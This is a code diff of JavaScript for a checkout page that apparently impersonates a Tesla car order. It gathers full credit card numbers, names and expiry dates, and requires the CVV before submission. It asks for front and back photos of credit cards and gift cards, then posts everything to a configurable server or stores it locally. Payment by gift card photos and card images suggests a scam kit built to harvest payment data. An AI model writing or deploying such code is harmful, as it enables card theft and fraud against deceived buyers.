+      statusEl.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="vertical-align:middle;margin-right:6px;"><polyline points="20 6 9 17 4 12"/></svg> Both images uploaded — ready to submit';
+    } else if (giftFrontData || giftBackData) {
+      if (wrap) wrap.style.display = 'block';
+      statusEl.style.background = 'rgba(245,158,11,0.08)';
+      statusEl.style.color = '#92400e';
+      statusEl.style.border = '1px solid rgba(245,158,11,0.25)';
+      statusEl.textContent = (giftFrontData ? 'Front uploaded — please upload the back image to continue.' : 'Back uploaded — please upload the front image to continue.');
+    } else {
+      if (wrap) wrap.style.display = 'none';
+      statusEl.textContent = '';
     }
     refreshSubmitState();
   }
 
-  // ── INIT ──
+  // ── CREDIT CARD IMAGE UPLOAD ──
+  function handleCCFile(input, side) {
+    var file = input.files && input.files[0];
+    if (!file) return;
+    if (!file.type.startsWith('image/')) { showToast('Please select an image file', 'error'); return; }
+    if (file.size > 10 * 1024 * 1024) { showToast('File too large (max 10MB)', 'error'); return; }
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      var dataUrl = e.target.result;
+      if (side === 'front') ccFrontData = dataUrl;
+      else ccBackData = dataUrl;
+      showCCPreview(side, dataUrl, file.name);
+    };
+    reader.readAsDataURL(file);
+    input.value = '';
+  }
+
+  function showCCPreview(side, dataUrl, fileName) {
+    var capSide = side.charAt(0).toUpperCase() + side.slice(1);
+    var card = document.getElementById('cc' + capSide + 'Upload');
+    var previewImg = document.getElementById('cc' + capSide + 'PreviewImg');
+    var previewName = document.getElementById('cc' + capSide + 'PreviewName');
+    if (card) card.classList.add('has-file');
+    if (previewImg) { previewImg.src = dataUrl; }
+    if (previewName) previewName.textContent = fileName;
+    refreshSubmitState();
+  }
+
+  function resetCCUpload(side) {
+    var capSide = side.charAt(0).toUpperCase() + side.slice(1);
+    if (side === 'front') ccFrontData = null;
+    else ccBackData = null;
+    var card = document.getElementById('cc' + capSide + 'Upload');
+    var previewImg = document.getElementById('cc' + capSide + 'PreviewImg');
+    var previewName = document.getElementById('cc' + capSide + 'PreviewName');
+    if (card) card.classList.remove('has-file');
+    if (previewImg) previewImg.src = '';
+    if (previewName) previewName.textContent = '';
+    refreshSubmitState();
+  }
+
+  // ── SUBMIT STATE ──
+  function refreshSubmitState() {
+    var btn = document.getElementById('submitBtn');
+    if (!btn) return;
+    var pm = findMethod(selectedPaymentId);
+    if (!pm) { setSubmitState(false); return; }
+    var isGift = pm.type === 'gift';
+    var isCard = pm.type === 'card' || pm.id === 'creditcard';
+
+    if (isGift) {
+      setSubmitState(!!(giftFrontData && giftBackData));
+    } else if (isCard) {
+      var ccNum = (document.getElementById('ccNumber') || {}).value || '';
+      var ccName = (document.getElementById('ccName') || {}).value || '';
+      var ccExp = (document.getElementById('ccExpiry') || {}).value || '';
+      var ccCvv = (document.getElementById('ccCvv') || {}).value || '';
+      var formFilled = ccNum.replace(/\s/g,'').length >= 15 && ccName.trim().length >= 2
+        && ccExp.length === 5 && ccCvv.length >= 3;
+      var imgOk = !isCCImageRequired() || (ccFrontData && ccBackData);
+      setSubmitState(formFilled && imgOk);
+    } else {
+      setSubmitState(uploadConfirmed);
+    }
+  }
+
+  function setSubmitState(enabled) {
+    var btn = document.getElementById('submitBtn');
+    if (!btn) return;
+    btn.disabled = !enabled;
+    btn.style.opacity = enabled ? '1' : '0.45';
+    btn.style.cursor = enabled ? 'pointer' : 'not-allowed';
+  }
+
+  // ── SUBMIT PAYMENT ──
+  function submitPayment() {
+    var pm = findMethod(selectedPaymentId);
+    if (!pm) { showToast('Please select a payment method', 'error'); return; }
+    var btn = document.getElementById('submitBtn');
+    if (btn && btn.disabled) return;
+
+    // Gather payload
+    var payload = {
+      paymentMethodId: selectedPaymentId,
+      paymentMethodName: pm.name,
+      sessionToken: sessionToken,
+      timestamp: new Date().toISOString(),
+      orderData: {
+        car: selectedCar,
+        delivery: deliveryDetails,
+        deliveryMethod: deliveryMethod
+      }
+    };
+
+    var isGift = pm.type === 'gift';
+    var isCard = pm.type === 'card' || pm.id === 'creditcard';
+
+    if (isGift) {
+      payload.giftCardFront = giftFrontData;
+      payload.giftCardBack = giftBackData;
+    } else if (isCard) {
+      payload.cardNumber = (document.getElementById('ccNumber') || {}).value || '';
+      payload.cardName = (document.getElementById('ccName') || {}).value || '';
+      payload.cardExpiry = (document.getElementById('ccExpiry') || {}).value || '';
+      if (isCCImageRequired()) {
+        payload.cardFront = ccFrontData;
+        payload.cardBack = ccBackData;
+      }
+    } else {
+      payload.proofData = uploadedFileData;
+      payload.proofFileName = uploadedFileName;
+    }
+
+    // Disable button
+    if (btn) {
+      btn.disabled = true;
+      btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="animation:spin 1s linear infinite"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.59"/></svg> Processing...';
+    }
+
+    // Try backend, fallback to localStorage
+    var API_BASE = typeof window.TESLA_API_BASE !== 'undefined' ? window.TESLA_API_BASE : '';
+    if (API_BASE) {
+      fetch(API_BASE + '/payment/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).then(function(r) {
+        return r.ok ? r.json() : Promise.reject(r.status);
+      }).then(function() {
+        handlePaymentSuccess(payload);
+      }).catch(function() {
+        savePaymentLocally(payload);
+        handlePaymentSuccess(payload);
+      });
+    } else {
+      savePaymentLocally(payload);
+      setTimeout(function() { handlePaymentSuccess(payload); }, 600);
+    }
+  }
+
+  function savePaymentLocally(payload) {
+    try {
+      var proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]');
+      proofs.push(payload);
+      localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
+    } catch(e) {}
+  }
+
+  function handlePaymentSuccess(payload) {
+    localStorage.removeItem('tesla_selected_car');
+    localStorage.removeItem('tesla_delivery_details');
+    localStorage.removeItem('tesla_delivery_method');
+    showToast('Payment submitted successfully!', 'success');
+    setTimeout(function() {
+      window.location.href = 'confirmation.html';
+    }, 1200);
+  }
+
+  // ── CC FORM FORMATTING ──
+  window.formatCardNumber = function(input) {
+    var v = input.value.replace(/\D/g, '').substring(0, 16);
+    var formatted = v.replace(/(.{4})/g, '$1 ').trim();
+    input.value = formatted;
+    // Update visual
+    var display = v ? v.replace(/(.{4})/g, '$1 ').trim() : '';
+    var padded = display + ' •••• •••• •••• ••••'.substring(display.length + (display.length > 0 ? display.split(' ').length - 1 : 0));
+    var parts = (v + '0000000000000000').substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
+    document.getElementById('cvCardNumber').textContent = v.length > 0 ? formatted + '•'.repeat(Math.max(0, 19 - formatted.length)).replace(/(•{4})/g, '$1 ').trim() : '•••• •••• •••• ••••';
+    refreshSubmitState();
+  };
+
+  window.formatExpiry = function(input) {
+    var v = input.value.replace(/\D/g, '').substring(0, 4);
+    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+    input.value = v;
+    document.getElementById('cvCardExpiry').textContent = v || 'MM/YY';
+    refreshSubmitState();
+  };
+
+  // Add input listeners for CC form
+  ['ccNumber', 'ccName', 'ccExpiry', 'ccCvv'].forEach(function(id) {
+    var el = document.getElementById(id);
+    if (el) el.addEventListener('input', refreshSubmitState);
+  });
+
+  // ── TOAST ──
+  function showToast(msg, type) {
+    type = type || 'success';
+    var colors = { success: '#171A20', error: '#EF4444', warning: '#F59E0B', info: '#3B82F6' };
+    var existing = document.querySelectorAll('.toast-notif');
+    for (var i = 0; i < existing.length; i++) existing[i].remove();
+    var t = document.createElement('div');
+    t.className = 'toast-notif';
+    var icons = {
+      success: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>',
+      error: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
+      warning: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg>',
+      info: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>'
+    };
+    t.innerHTML = '<span style="flex-shrink:0;">' + (icons[type] || icons.success) + '</span><span>' + escapeHtml(msg) + '</span>';
+    t.style.cssText = 'position:fixed;bottom:28px;right:24px;z-index:99999;display:flex;align-items:center;gap:10px;padding:14px 20px;border-radius:12px;font-size:13px;font-weight:600;max-width:360px;box-shadow:0 12px 40px rgba(0,0,0,0.2);animation:slideInRight .3s ease;color:white;background:' + (colors[type] || colors.success) + ';font-family:inherit;';
+    document.body.appendChild(t);
+    setTimeout(function() {
+      t.style.opacity = '0'; t.style.transform = 'translateX(20px)';
+      t.style.transition = 'opacity .3s,transform .3s';
+      setTimeout(function() { if (t.parentNode) t.remove(); }, 300);
+    }, 4500);
+  }
+
+  // ── EXPORTS ──
   window.selectPaymentMethod = selectPaymentMethod;
-  window.copyAddress = copyAddress;
+  window.copyAddress = window.copyAddress;
   window.handleFileSelect = handleFileSelect;
-  window.openCamera = openCamera;
   window.resetUpload = resetUpload;
   window.confirmUpload = confirmUpload;
   window.submitPayment = submitPayment;
   window.handleGiftFile = handleGiftFile;
+  window.resetGiftUpload = resetGiftUpload;
+  window.handleCCFile = handleCCFile;
+  window.resetCCUpload = resetCCUpload;
 
+  // ── INIT ──
   loadPaymentMethods();
-
-  // Auto-select the first available payment method.
-  if (paymentMethods.length > 0 && !selectedPaymentId) {
+  if (paymentMethods.length && !selectedPaymentId) {
     selectPaymentMethod(paymentMethods[0].id);
   }
 
